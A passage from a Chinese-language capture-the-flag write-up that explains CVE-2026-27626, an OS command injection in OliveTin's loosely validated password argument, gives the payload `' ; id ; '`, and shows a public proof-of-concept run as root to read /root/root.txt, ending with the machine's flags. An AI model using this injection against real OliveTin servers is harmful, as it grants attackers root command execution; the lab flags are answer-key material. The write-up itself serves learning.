
```bash
git clone https://github.com/0xh7ml/CVE-2026-27626-PoC
cd CVE-2026-27626-PoC
```

**漏洞原理(CVE-2026-27626)**:OliveTin 讓管理員定義「Action」,每個 Action 背後是一段 shell 指令模板,模板用 `{{argname}}` 這種 placeholder 代表網頁表單填入的參數值,執行時把填入值直接字串替換進模板再丟給 shell 跑。這裡的 Backup Database action 範本是:
```
mysqldump -u {{db_user}} -p'{{db_pass}}' {{db_name}} > /opt/backups/backup.sql
```

為了擋掉明顯的 shell injection,OliveTin 對大部分參數型別(像這裡的 `db_user`/`db_name`,型別是 `ascii_identifier`)會先套一個嚴格的白名單字元正規表示式驗證,過濾掉 `;`、`'`、`` ` ``、`$()` 之類的 shell 特殊字元。但 `password` 這個型別因為要容許密碼本身含任意符號,驗證規則被放得鬆很多,幾乎沒有過濾——這就是漏洞所在:同樣是「會被原封不動替換進 shell 指令模板」的參數,只因為宣告型別是 `password` 就跳過了該有的字元過濾。

這類注入的典型做法,是在 `db_pass` 填入類似 `' ; id ; '` 的值:先用單引號提早結束 mysqldump 本來的 `-p'...'` 參數,再用 `;` 接上要跑的指令,最後補一組引號讓語法不至於整段崩潰。模板展開後大致變成 `mysqldump -u backup_svc -p'' ; id ; '' production > /opt/backups/backup.sql`,shell 依序執行:壞掉的 `mysqldump`(沒密碼直接印 usage、以 exit 2 結束)→ 注入的指令(`id`)→ 殘餘的輸出重導向(對不存在的目錄寫檔失敗)。這正好對應後面實際執行結果裡 `exit status 2` + usage + 指令輸出 + `cannot create ...` 三段一起出現的現象。

本質是 **CWE-78(OS Command Injection)**,根因是「依賴參數型別白名單做輸入驗證,但驗證規則對 `password` 型別特別寬鬆」的設計缺陷,不是完全沒驗證。因為 Backup Database 這個 Action 是用 OliveTin 服務本身的權限執行 `mysqldump`,而這台機器上 OliveTin 是以 root 權限跑的,所以注入進去的指令也以 root 執行——這就是能直接拿 root flag 的原因。

```
❯ python3 CVE-2026.27626.py -u 127.0.0.1 -p 8000 -x "cat /root/root.txt"
[+] Execution ID: d21b48c5-963e-49f9-a778-8180d75e12e4
======================================================================
Command Output
======================================================================
exit status 2

Usage: mysqldump [OPTIONS] database [tables]
...
a36953eadb51508183d3ba0cf9672905
sh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent
======================================================================
```

**觀念**:`exit status 2` 是模板裡原本 `mysqldump` 指令自己的退出碼,因為注入破壞了它的參數格式(引號提早關閉),先印出 usage 說明並以 exit 2 結束;真正被注入的指令(`cat /root/root.txt`)用 `;` 分隔接著照樣執行,輸出 flag 內容證明指令執行成功;最後 `cannot create /opt/backups/backup.sql` 是原模板最後輸出重導向失敗(目錄不存在),跟注入無關。三段都是正常現象,不是失敗。

直接用這個指令執行原語拿 root flag,沒必要另外彈互動式 shell。

**Root flag**:`a36953eadb51508183d3ba0cf9672905`

---

## Flags

| | Flag |
|---|---|
| User (haris) | `7627c823e70b0c3e2778e08309e1de70` |
| Root | `a36953eadb51508183d3ba0cf9672905` |
